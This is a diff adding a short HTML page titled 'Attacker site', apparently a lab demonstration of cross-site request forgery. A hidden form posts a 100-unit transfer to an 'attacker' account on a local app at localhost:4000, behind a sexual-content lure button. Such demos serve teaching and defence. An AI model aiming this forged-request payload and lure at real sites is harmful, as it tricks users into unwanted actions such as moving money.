@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Attacker site</title>
+
+</head>
+
+<body>
+  <form action="http://localhost:4000/transfer" method="POST">
+    <input type="hidden" name="fromAccount" value="google" />
+    <input type="hidden" name='toAccount' value="attacker">
+    <input type="hidden" name='amount' value="100">
+    <input type="submit" value="View Sexy Girls' Pictures!" />
+  </form>
+</body>
+
+</html>
